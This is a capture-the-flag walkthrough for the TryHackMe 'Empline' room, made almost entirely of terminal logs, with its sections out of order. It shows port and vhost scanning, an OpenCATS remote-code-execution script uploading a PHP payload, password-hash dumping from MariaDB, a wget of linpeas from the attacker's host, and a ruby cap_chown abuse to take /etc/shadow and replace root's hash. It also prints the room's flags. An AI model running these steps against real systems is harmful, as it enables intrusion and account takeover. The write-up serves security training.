# Empline — Writeup

## Overview
### Empline — Writeup
### Empline — Writeup
----
Are you good enough to apply for this job?
----
![111](https://tryhackme-images.s3.amazonaws.com/room-icons/189112ffef41c0fa813d7d5b394a58b5.png)
### Deploy The Box
Start Machine
Deploy and compromise the machine!
![222](https://i.imgur.com/gCpTGtH.png)
Make sure you're connected to [TryHackMe's network](https://tryhackme.com/access). If you don't know how to do this, complete the [OpenVPN room](https://tryhackme.com/room/openvpn) first.
Answer the questions below
Deploy the machine!
Question Done

## Privilege Escalation
```text
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
george:x:1002:1002::/home/george:/bin/bash

┌──(witty㉿kali)-[~/Downloads]
└─$ mysql -h 10.10.183.162 -u james -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 105
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| opencats           |
+--------------------+
2 rows in set (0.192 sec)

MariaDB [(none)]> use opencats;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [opencats]> show tables;
+--------------------------------------+
| Tables_in_opencats                   |
+--------------------------------------+
| access_level                         |
| activity                             |
| activity_type                        |
| attachment                           |
| calendar_event                       |
| calendar_event_type                  |
| candidate                            |
| candidate_joborder                   |
| candidate_joborder_status            |
| candidate_joborder_status_history    |
| candidate_jobordrer_status_type      |
| candidate_source                     |
| candidate_tag                        |
| career_portal_questionnaire          |
| career_portal_questionnaire_answer   |
| career_portal_questionnaire_history  |
| career_portal_questionnaire_question |
| career_portal_template               |
| career_portal_template_site          |
| company                              |
| company_department                   |
| contact                              |
| data_item_type                       |
| eeo_ethnic_type                      |
| eeo_veteran_type                     |
| email_history                        |
| email_template                       |
| extension_statistics                 |
| extra_field                          |
| extra_field_settings                 |
| feedback                             |
| history                              |
| http_log                             |
| http_log_types                       |
| import                               |
| installtest                          |
| joborder                             |
| module_schema                        |
| mru                                  |
| queue                                |
| saved_list                           |
| saved_list_entry                     |
| saved_search                         |
| settings                             |
| site                                 |
| sph_counter                          |
| system                               |
| tag                                  |
| user                                 |
| user_login                           |
| word_verification                    |
| xml_feed_submits                     |
| xml_feeds                            |
| zipcodes                             |
+--------------------------------------+
54 rows in set (0.326 sec)

MariaDB [opencats]> describe user;
+---------------------------+--------------+------+-----+---------+----------------+
| Field                     | Type         | Null | Key | Default | Extra          |
+---------------------------+--------------+------+-----+---------+----------------+
| user_id                   | int(11)      | NO   | PRI | NULL    | auto_increment |
| site_id                   | int(11)      | NO   | MUL | 0       |                |
| user_name                 | varchar(64)  | NO   |     |         |                |
| email                     | varchar(128) | YES  |     | NULL    |                |
| password                  | varchar(128) | NO   |     |         |                |
| access_level              | int(11)      | NO   | MUL | 100     |                |
| can_change_password       | int(1)       | NO   |     | 1       |                |
| is_test_user              | int(1)       | NO   |     | 0       |                |
| last_name                 | varchar(40)  | NO   | MUL |         |                |
| first_name                | varchar(40)  | NO   | MUL |         |                |
| is_demo                   | int(1)       | YES  |     | 0       |                |
| categories                | varchar(192) | YES  |     | NULL    |                |
| session_cookie            | varchar(256) | YES  |     | NULL    |                |
| pipeline_entries_per_page | int(8)       | YES  |     | 15      |                |
| column_preferences        | longtext     | YES  |     | NULL    |                |
| force_logout              | int(1)       | YES  |     | 0       |                |
| title                     | varchar(64)  | YES  |     |         |                |
| phone_work                | varchar(64)  | YES  |     |         |                |
| phone_cell                | varchar(64)  | YES  |     |         |                |
| phone_other               | varchar(64)  | YES  |     |         |                |
| address                   | text         | YES  |     | NULL    |                |
| notes                     | text         | YES  |     | NULL    |                |
| company                   | varchar(255) | YES  |     | NULL    |                |
| city                      | varchar(64)  | YES  |     | NULL    |                |
| state                     | varchar(64)  | YES  |     | NULL    |                |
| zip_code                  | varchar(16)  | YES  |     | NULL    |                |
| country                   | varchar(128) | YES  |     | NULL    |                |
| can_see_eeo_info          | int(1)       | YES  |     | 0       |                |
+---------------------------+--------------+------+-----+---------+----------------+
28 rows in set (0.350 sec)

MariaDB [opencats]> select user_name,password from user;
+----------------+----------------------------------+
| user_name      | password                         |
+----------------+----------------------------------+
| admin          | b67b5ecc5d8902ba59c65596e4c053ec |
| cats@rootadmin | cantlogin                        |
| george         | 86d0dfda99dbebc424eb4407947356ac |
| james          | e53fbdb31890ff3bc129db0e27c473c9 |
+----------------+----------------------------------+
4 rows in set (0.219 sec)

MariaDB [opencats]> exit
Bye

george:pretonnevippasempre

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh george@10.10.183.162
The authenticity of host '10.10.183.162 (10.10.183.162)' can't be established.
ED25519 key fingerprint is SHA256:Zy2CJ55rf4XCqfOlavd68DrxEEE51RIMUi0ps+yk6Tc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.183.162' (ED25519) to the list of known hosts.
george@10.10.183.162's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Apr 10 17:34:05 UTC 2023

  System load:  0.0               Processes:           95
  Usage of /:   4.5% of 38.71GB   Users logged in:     0
  Memory usage: 59%               IP address for eth0: 10.10.183.162
  Swap usage:   0%

28 updates can be applied immediately.
7 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

george@empline:~$ pwd
/home/george
george@empline:~$ ls
user.txt
george@empline:~$ cat user.txt
91cb89c70aa2e5ce0e0116dab099078e

george@empline:~$ sudo -l
[sudo] password for george: 
Sorry, user george may not run sudo on empline.
george@empline:~$ cd /tmp
george@empline:/tmp$ ls
systemd-private-4c2ec1941ead437199c2287abaf4b4e1-apache2.service-XLbS9a
systemd-private-4c2ec1941ead437199c2287abaf4b4e1-systemd-resolved.service-jHAmhK
george@empline:/tmp$ wget http://10.8.19.103:1234/linpeas.sh
--  http://10.8.19.103:1234/linpeas.sh
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh           100%[====================>] 808.69K   229KB/s    in 3.5s    c

(229 KB/s) - ‘linpeas.sh’ saved [828098/828098]

george@empline:/tmp$ chmod +x linpeas.sh
george@empline:/tmp$ ./linpeas.sh 

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...
 
┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.183.162 - - [10/Apr/2023 13:36:14] "GET /linpeas.sh HTTP/1.1" 200 -

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current env capabilities:
Current: =
Current proc capabilities:
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep

"getcap" is a Linux command that is used to display the capabilities of a specific file or directory. Capabilities are a security feature in Linux that allow certain processes to perform privileged operations without requiring root access. By assigning specific capabilities to a file or directory, it is possible to grant certain processes limited access to system resources while still maintaining security. The "getcap" command is used to view the capabilities that have been assigned to a file or directory, which can be useful for troubleshooting security-related issues or configuring access control policies.

so how can I assign a getcap?

To assign capabilities to a file or directory, you can use the "setcap" command in Linux. The basic syntax for the command is:

`sudo setcap <capabilities> <file or directory>`

For example, to assign the "CAP_NET_RAW" capability to the "ping" command, you can run the following command:

bashCopy code

`sudo setcap cap_net_raw+ep /bin/ping`

In this example, the "cap_net_raw" capability allows the "ping" command to send network packets directly without requiring root access. The "+ep" option sets the capability and also preserves the existing file execution permissions.

It's important to note that assigning capabilities to a file or directory can potentially introduce security risks, so it should only be done when necessary and with careful consideration.

The command "/usr/local/bin/ruby = cap_chown+ep" assigns the "cap_chown" capability and the "ep" permission to the Ruby executable file located at "/usr/local/bin/ruby".

The "cap_chown" capability allows the file to change the ownership of any file on the system, which is typically a privilege that only the root user has. The "ep" permission, when set in combination with a capability, grants the ability to execute the file with the capabilities specified, even if the user executing the file does not have those capabilities themselves.

In summary, this command grants the Ruby executable file the ability to change the ownership of files on the system, and allows it to be executed with the same capabilities as the root user. As mentioned earlier, assigning capabilities to a file can introduce security risks, so it should only be done with careful consideration and in situations where it is necessary.

┌──(witty㉿kali)-[~/Downloads]
└─$ mkpasswd -m sha-512 Password1234  
$6$/T22zNk0evAC/hbG$ktZDggVaE3z9bP8poaISFmpf3Ue/yh6JzTCSGsuML5CTS/HtH1VKfrrUsIqn1PmkPqMHLnbuMg1KGyzUI32GH.

https://attackdefense.com/challengedetailsnoauth?cid=1365 (see video)

george@empline:/tmp$ id
uid=1002(george) gid=1002(george) groups=1002(george)

george@empline:/tmp$ ruby -e 'File.chown(1002,1002,"/etc/shadow")'
george@empline:/tmp$ ls -la /etc/shadow
-rw-r----- 1 george george 1081 Jul 20  2021 /etc/shadow

let's modify root pass

press i to modify then ctrl + o to save it writing :wqa! 

-   If you didn't make any changes, type `:q` and press Enter/return
-   If you made some changes and would like to **keep** them, type `:wq` and press Enter/return
-   If you made some changes and would rather **discard** them, type `:q!` and press Enter/return

george@empline:/tmp$ vim /etc/shadow
george@empline:/tmp$ head /etc/shadow
root:$6$/T22zNk0evAC/hbG$ktZDggVaE3z9bP8poaISFmpf3Ue/yh6JzTCSGsuML5CTS/HtH1VKfrrUsIqn1PmkPqMHLnbuMg1KGyzUI32GH.:18828:0:99999:7:::

george@empline:/tmp$ su -
Password: 
root@empline:~# cd /root
root@empline:~# ls
root.txt
root@empline:~# cat root.txt
74fea7cd0556e9c6f22e6f54bc68f5d5
```
User.txt
*91cb89c70aa2e5ce0e0116dab099078e*
Root.txt
*74fea7cd0556e9c6f22e6f54bc68f5d5*
### Thank You
Firstly, I would like to thank you for playing this machine. I hope you had fun with this one!
And also, thank you for the feedback on my first box ([Mustacchio](https://tryhackme.com/room/mustacchio)).
Finishing, a big thanks to [Touklwez](http://github.com/flav1o/).
Good Hacking!
Answer the questions below
Thank You!
Question Done

## Flags / Answers
- Get all the flags to complete the room.
- Answer the questions below
```text
- ┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.183.162 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.183.162:22
Open 10.10.183.162:80
Open 10.10.183.162:3306
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Connect Scan
Scanning empline.thm (10.10.183.162) [3 ports]
Discovered open port 3306/tcp on 10.10.183.162
Discovered open port 80/tcp on 10.10.183.162
Discovered open port 22/tcp on 10.10.183.162
Completed Connect Scan (3 total ports)
Initiating Service scan
Scanning 3 services on empline.thm (10.10.183.162)
Completed Service scan (3 services on 1 host)
NSE: Script scanning 10.10.183.162.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for empline.thm (10.10.183.162)
Host is up, received user-set (0.19s latency).

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c0d541eea4d0830c970d75cc7b107f76 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDR9CEnxhm89ZCC+SGhOpO28srSTnL5lQtnqd4NaT7hTT6N1NrRZQ5DoB6cBI+YlaqYe3I4Ud3y7RF3ESms8L21hbpQus2UYxbWOl+/s3muDpZww1nvI5k9oJguQaLG1EroU8tee7yhPID0+285jbk5AZY72pc7NLOMLvFDijArOhj9kIcsPLVTaxzQ6Di+xwXYdiKO0F3Y7GgMMSszIeigvZEDhNnNW0Z1puMYbtTgmvJH6LpzMSEC+32iNRGlvbjebE9Ehh+tGiOuHKXT1uexrt7gbkjp3lJteV5034a7G1t/Vi3JJoj9tMV/CrvgeDDncbT5NNaSA6/ynLLENqSP
|   256 8382f969197d0d5c5365d554f645db74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFhf+BTt0YGudpgOROEuqs4YuIhT1ve23uvZkHhN9lYSpK9WcHI2K5IXIi+XgPeSk/VIQLsRUA0kOqbsuoxN+u0=
|   256 4f913e8b696909700e8226285c8471c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDkr5yXgnawt7un+3Tf0TJ+sZTrbVIY0TDbitiu2eHpf
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Empline
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
3306/tcp open  mysql   syn-ack MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 95
|   Capabilities flags: 63487
|   Some Capabilities: ConnectWithDatabase, ODBCClient, InteractiveClient, LongPassword, LongColumnFlag, SupportsCompression, Support41Auth, Speaks41ProtocolNew, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 8Rqe(3g.Ls!G#wRqd~m)
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.81 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts       
10.10.183.162 empline.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster vhost -u http://empline.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain       
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://empline.thm
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: job.empline.thm Status: 200 [Size: 3671]
Found: gc._msdcs.empline.thm Status: 400 [Size: 422]

┌──(witty㉿kali)-[~/Downloads]
└─$ wfuzz -u empline.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.empline.thm" --hc 404 --hw 914
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://empline.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload          
=====================================================================

000000266:   200        101 L    291 W      3671 Ch     "job" 

found 1 subdomain

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.183.162 empline.thm job.empline.thm

https://www.exploit-db.com/exploits/50585

another way https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/

┌──(witty㉿kali)-[/tmp]
└─$ ./opencats.sh http://job.empline.thm/
 _._     _,-'""`-._ 
(,-.`._,'(       |\`-/|        RevCAT - OpenCAT RCE
    `-.-' \ )-`( , o o)         Nicholas  Ferreira
          `-    \`_`"'-   https://github.com/Nickguitar-e 

[*] Attacking target http://job.empline.thm/
[*] Checking CATS version...
-e [*] Version detected: 0.9.4
[*] Creating temp file with payload...
[*] Checking active jobs...
./opencats.sh: 105: [[: not found
-e [+] Jobs found! Using job id 1
[*] Sending payload...
-e [+] Payload zp8st.php uploaded!
[*] Deleting created temp file...
